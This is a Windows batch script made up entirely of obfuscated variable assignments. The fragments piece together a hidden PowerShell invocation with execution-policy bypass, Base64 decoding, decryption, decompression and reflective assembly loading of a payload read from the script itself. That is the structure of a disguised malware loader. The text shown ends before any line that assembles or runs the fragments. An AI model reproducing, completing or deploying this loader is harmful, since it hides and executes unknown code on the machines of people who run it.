@echo off
set "QMbrjLMNNL=ll"
set "fKxhmLadfO=y "
set "eBczcSgYCS=po"
set "RoPvWKpDba=\v"
set "RvWEqpeTAZ=:\"
set "SgcNXonRop=we"
set "kynyMdmjsI=co"
set "ModMsLBEsg=ll"
set "lyMbYmafsj=in"
set "agOcYghfCk=.e"
set "YDyEFmWcNl= /"
set "SckIaNTiAg=Sy"
set "qFceqQJwkS=em"
set "SVEqaWLDkv=1."
set "kZPECJSAxX=0\"
set "RErqvefeLU=ws"
set "XWnQIGgvFT=rS"
set "uVfpaxtjgA=xe"
set "ZXuXWSykSn=rs"
set "oapUbziPfv= C"
set "xclitSmvXc=32"
set "VweXQFubeA=ow"
set "LmAYtwjgbA=\W"
set "GCuKGYqkkh=Po"
set "mzmbRRJMMv=we"
set "gKvnedZptg=st"
set "hVuyDCdobK=he"
set "exYIJdynTl=do"
set "gFufDlNfhp=s\"
set "AdmkMLGgEw=Wi"
set "brFuPkyUfd=py"
set "vdCNdkitxm=nd"
set "ROfdVrSfoh=he"
set "zpXBvnrMgb=cd"
set "soyBGoClkF= %~dp0"
set "EWBVevgWXo=d;$C"
set "aDqevwsjQx=tem."
set "GTeGOOmmlP=$PcN"
set "FIGzuQXDcj=);$T"
set "jcJelEaAtb=Mode"
set "fjFuAJjlOA=brea"
set "OnXMNakTrU=trea"
set "sWKtqENcjX=stem"
set "pjvsJroltQ=.Mem"
set "HjCRWvoZaQ=pher"
set "IThoVIniTg=F'[-"
set "DibimsRHzd=tem."
set "zMrANlZjDf=pose"
set "WWvcZfGgaE=and "
set "UdrgJmGkEX=join"
set "pQhYVxlErB=e]::"
set "aBwHLEmpKz=bstr"
set "HUzNaqIfFm=O.Me"
set "fDbuwlXSXO=se()"
set "ERgiVBLylx=wXHx"
set "huUznfRlKT=$Nsr"
set "PQtOnVyKOS=-nop"
set "ZFIPhuyZbF=WB, "
set "ttfrxMQtWZ=N = "
set "jGRAetQJxS=ert]"
set "EOwexaVeMQ=.Ass"
set "JUqSLvRvpV=iron"
set "KcmtgetWQd=ypto"
set "gOwlxIdUrg=ss -"
set "kpcJSamZCi=rans"
set "jKWDmkpYIl=th('"
set "arhSVgSDwz=-4] "
set "LoXrzZHyMg=ach "
set "vLWjdxwmxr= = ["
set "eivXWQuZAI=6] -"
set "gPoJPaYmVU=yste"
set "sutRYFwhRi=ct S"
set "McNUivtBlY=ne);"
set "jvryPVIXMZ=ionM"
set "TzbytRlJAG=V = "
set "hHoZugANYg=SN.D"
set "tsKAANJVPP=$MnF"
set "RlJDlbyPAk='[-1"
set "HjqSxzUcmD=embl"
set "qgCFgSUerP= '')"
set "vOySizdhni=)))"
set "OlMnAOoiMO=Secu"
set "RlfTwaGUkK=.Mod"
set "RjkWfKxyxA=ptog"
set "dQgcDjrnRL=lBlo"
set "EktDQLMVAU=n ''"
set "uMAlKWRmdH=daeR"
set "bcPVerdTKp=HRr."
set "lcseYsUvHL=Syst"
set "jdAbfyZEXT=y]::"
set "RatqMaMssT=comp"
set "EUdqgnRFKy=md ="
set "IjrKAKUnTt=ment"
set "LAppsNBaUb=tem."
set "PLMKpahrvG=dmBu"
set "kqPlpMqvOB='txe"
set "KzPBYBlDti=ode]"
set "JCeIPDXHDy=] -j"
set "eUNGOVNkSz=Secu"
set "euJfwzRWLP=oin "
set "tMxJfpIyPZ=;$dm"
set "GVJgriKRSA=.Dis"
set "uYYwAyewre=bjec"
set "AOfoUyagqs===')"
set "YAWXqUXLba=.Sec"
set "TVhCzkQtwU= = N"
set "dXCkHwfkVK=mory"
set "ECpkFotZgB=ispo"
set "GSFuydpgdR=; };"
set "iwYLvXeXnw=srmd"
set "wwfdQxewuj=in $"
set "wWSXsfQvXQ=[Sys"
set "lGSzfeIOlV=efBW"
set "WsioRrQmRX=.Com"
set "pTefQJPylH=Obje"
set "wJCTXuKQoB=ewLi"
set "PnVRwPbYdn=CFiH"
set "CHAFyTbIRu=bypa"
set "KzJWTZCZHx=ress"
set "IyiOwWECmQ=.Cry"
set "jEBAgLOANf= '')"
set "bLThjpaOaT=Conv"
set "NQIbgMebFd=nage"
set "tEIPSsCyjP=yTo("
set "PsaQTcxauJ=/a3B"
set "ySkPinzAIr=:('g"
set "xFdtTgJFMj=md.T"
set "thlvALsCTh=em.C"
set "JuAhHyINoj=..-1"
set "yqNQZOVdQv=TllA"
set "GUDekQwWFk=ke($"
set "poyQiiSiLB=TuCw"
set "waNnjSqWXB=pStr"
set "XoeluJksmP=oint"
set "KDoQXQDMTM=('%~f0'"
set "ZcCjKmGFah=b6t6"
set "lXqzgEgeGU=.Cry"
set "oNVswpmHmZ=[]] "
set "rHHlZjxlNl=orF'"
set "MyITZZdYOf=tryP"
set "ELlLIrOAjS=[Env"
set "SsINXCmuRX=DPgi"
set "VIcWvYhrpr=-joi"
set "sPBMLFUDyk=-ep "
set "vFSgSLZIfj=)) {"
set "LSNcHMWTgP=157K"
set "xmVxDukbSf=ect "
set "fkyKzQPBDH=SoYj"
